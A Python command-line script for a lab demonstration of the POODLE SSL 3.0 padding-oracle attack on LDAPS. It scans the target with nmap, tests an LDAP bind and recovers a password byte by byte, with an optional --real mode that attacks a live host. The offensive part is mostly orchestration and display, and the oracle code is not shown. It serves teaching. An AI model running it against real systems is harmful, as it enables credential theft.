#!/usr/bin/env python3
"""cli.py — POODLE CVE-2014-3566 LDAPS attack demo (terminal UI)."""

import argparse
import sys
import time
import os

from ssl3_verify import verify_ssl3, ldap_bind_ssl3
from poodle_engine import PoodleEngine

# --- ANSI colors ---
RST = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  POODLE  CVE-2014-3566  —  SSL 3.0 CBC Padding Oracle      ║
║  LDAPS Attack Demo                           CECOMSA Lab    ║
╚══════════════════════════════════════════════════════════════╝{RST}
""")


def ok(msg):
    print(f"  {GREEN}[OK]{RST}   {msg}")


def fail(msg):
    print(f"  {RED}[FAIL]{RST} {msg}")


def warn(msg):
    print(f"  {YELLOW}[WARN]{RST} {msg}")


def info(msg):
    print(f"  {CYAN}[INFO]{RST} {msg}")


def phase(num, title, tag):
    color = GREEN if tag == "REAL" else YELLOW
    print(f"\n{BOLD}{'─'*64}{RST}")
    print(f"{BOLD}  Phase {num}: {title}  {color}[{tag}]{RST}")
    print(f"{BOLD}{'─'*64}{RST}")


# --- Phase 1: SSL 3.0 verification ---
def run_verify(host, port):
    phase(1, "SSL 3.0 Verification", "REAL")
    info(f"Running nmap ssl-poodle against {host}:{port}...")

    result = verify_ssl3(host, port)

    if result["vulnerable"]:
        ok(f"VULNERABLE to POODLE (CVE-2014-3566)")
        print(f"         Protocol:  {result['ssl_version'] or 'SSLv3'}")
        print(f"         Cipher:    {result['cipher_suite'] or '(see nmap output)'}")
        print(f"         CBC mode:  {'YES' if result['cipher_is_cbc'] else 'check below'}")
        if result.get("cert_subject"):
            print(f"         Subject:   {result['cert_subject']}")
        if result.get("cert_issuer"):
            print(f"         Issuer:    {result['cert_issuer']}")
        if result["cipher_is_cbc"]:
            ok(f"CBC cipher confirmed — POODLE attack is possible")

        # Show relevant nmap output
        if result.get("nmap_output"):
            print(f"\n{DIM}  nmap output:{RST}")
            for line in result["nmap_output"].splitlines():
                stripped = line.strip()
                if stripped and ("ssl-poodle" in stripped.lower()
                                or "vulnerable" in stripped.lower()
                                or "state:" in stripped.lower()
                                or "ids:" in stripped.lower()
                                or "/tcp" in stripped):
                    print(f"  {DIM}{stripped}{RST}")
    else:
        fail(f"Not vulnerable: {result.get('error', 'unknown')}")

    return result


# --- Phase 2: LDAP Bind ---
def run_bind(host, port, dn, password):
    phase(2, "LDAP Bind Test", "REAL")
    info(f"Sending LDAP Simple Bind over TLS to {host}:{port}...")
    info(f"DN: {dn}")

    result = ldap_bind_ssl3(host, port, dn, password)

    if result["bind_success"]:
        ok("LDAP Bind SUCCESS — credentials accepted over SSL 3.0")
    elif result["error"]:
        fail(f"LDAP Bind failed: {result['error']}")
    else:
        warn(f"LDAP Bind rejected (resultCode={result.get('result_code', '?')})")

    if result.get("request_hex"):
        print(f"         Request:  {result['request_hex'][:60]}...")
    if result.get("response_hex"):
        print(f"         Response: {result['response_hex'][:60]}...")

    return result


# --- Phase 3: POODLE attack ---
def run_attack(password, speed, real_oracle=None):
    tag = "REAL" if real_oracle else "CRYPTO SIM"
    phase(3, "POODLE Padding Oracle Attack", tag)

    delay = {"slow": 0.008, "normal": 0.003, "fast": 0.0005}.get(speed, 0.003)
    engine = PoodleEngine(password, attempt_delay=delay, real_oracle=real_oracle)
    pw_len = len(password)

    info(f"Recovering {pw_len} bytes — each oracle query has P(hit) = 1/256")
    info(f"Speed: {speed} (delay={delay*1000:.1f}ms/query)")
    print()

    # Password display slots
    recovered_chars = ["??"] * pw_len
    recovered_hex = ["??"] * pw_len
    total_attempts = 0
    start_time = time.time()

    # Widths for the progress line
    try:
        cols = os.get_terminal_size().columns
    except OSError:
        cols = 80

    def render_password():
        """Render the current state of recovered bytes."""
        ascii_line = " ".join(
            f"{GREEN}{BOLD}{c}{RST}" if c != "??" else f"{DIM}??{RST}"
            for c in recovered_chars
        )
        hex_line = " ".join(
            f"{GREEN}{h}{RST}" if h != "??" else f"{DIM}??{RST}"
            for h in recovered_hex
        )
        print(f"\r\033[K  ASCII: [ {ascii_line} ]")
        print(f"\033[K  HEX:   [ {hex_line} ]")

    def clear_lines(n):
        for _ in range(n):
            sys.stdout.write("\033[A\033[K")

    # Initial render
    render_password()

    for byte_idx in range(pw_len):
        attempt_count = 0

        def byte_cb(attempt_num, oracle_hit, _idx=byte_idx):
            nonlocal attempt_count
            attempt_count = attempt_num
            total = total_attempts + attempt_num
            elapsed = time.time() - start_time

            # Status line (overwrite)
            indicator = f"{BG_GREEN}{BOLD} HIT {RST}" if oracle_hit else f"{BG_RED} MISS{RST}"
            bar_done = int((_idx / pw_len) * 30)
            bar = f"{'█' * bar_done}{'░' * (30 - bar_done)}"

            status = (
                f"\r\033[K  {bar} "
                f"Byte {_idx+1}/{pw_len}  "
                f"Query #{attempt_num:<5} "
                f"Total: {total:<6} "
                f"{indicator} "
                f"{DIM}{elapsed:.1f}s{RST}"
            )
            sys.stdout.write(status)
            sys.stdout.flush()

        byte_val, attempts = engine.recover_byte(byte_idx, byte_cb)
        total_attempts += attempts

        if byte_val < 0:
            print()
            fail("Attack stopped")
            return

        byte_char = chr(byte_val) if 32 <= byte_val < 127 else "."
        recovered_chars[byte_idx] = f"{byte_char} "[:2]
        recovered_hex[byte_idx] = f"{byte_val:02X}"

        # Clear status line and re-render password
        sys.stdout.write("\r\033[K")
        clear_lines(2)
        render_password()

    elapsed = time.time() - start_time
    avg = total_attempts / pw_len

    # Final result
    recovered_password = "".join(c.strip() for c in recovered_chars)
    print()
    print(f"{BOLD}{'─'*64}{RST}")
    print(f"  {GREEN}{BOLD}RECOVERED: {recovered_password}{RST}")
    print(f"{BOLD}{'─'*64}{RST}")
    print(f"  Total oracle queries: {total_attempts}")
    print(f"  Average per byte:     {avg:.0f}  (expected ~256)")
    print(f"  Time elapsed:         {elapsed:.2f}s")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="POODLE CVE-2014-3566 — LDAPS Attack Demo (CLI)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python3 cli.py                              # defaults: 192.168.56.50:636
  python3 cli.py -H 10.0.0.5 -p 636          # custom target
  python3 cli.py --speed slow                 # slower for presentation
  python3 cli.py --skip-bind                  # skip LDAP bind test
  python3 cli.py --attack-only -P secret123   # skip verification, just demo
        """,
    )
    parser.add_argument("-H", "--host", default="192.168.56.50", help="Target host")
    parser.add_argument("-p", "--port", type=int, default=636, help="Target port")
    parser.add_argument("-D", "--bind-dn", default="labuser@lab.local", help="LDAP Bind DN")
    parser.add_argument("-P", "--password", default="LabUser@123", help="LDAP password (secret to recover)")
    parser.add_argument("--speed", choices=["slow", "normal", "fast"], default="normal", help="Attack speed")
    parser.add_argument("--skip-bind", action="store_true", help="Skip LDAP bind test")
    parser.add_argument("--attack-only", action="store_true", help="Skip all verification, run attack only")
    parser.add_argument("--real", action="store_true", help="Use real SSL 3.0 oracle against target (not simulation)")
    args = parser.parse_args()

    banner()

    if not args.attack_only:
        # Phase 1
        ssl_result = run_verify(args.host, args.port)
        if not ssl_result["vulnerable"]:
            fail("Target does not accept SSL 3.0 — cannot perform POODLE attack")
            print(f"\n  {DIM}Ensure the target has SSL 3.0 enabled (see setup-winserver-part2.ps1){RST}")
            sys.exit(1)

        # Phase 2
        if not args.skip_bind:
            run_bind(args.host, args.port, args.bind_dn, args.password)

    # Phase 3
    real_oracle = None
    if args.real:
        from poodle_engine import RealOracle
        info(f"Real oracle mode — connecting to {args.host}:{args.port} for each query")
        real_oracle = RealOracle(args.host, args.port, dn_base=args.bind_dn)

    run_attack(args.password, args.speed, real_oracle=real_oracle)


if __name__ == "__main__":
    main()
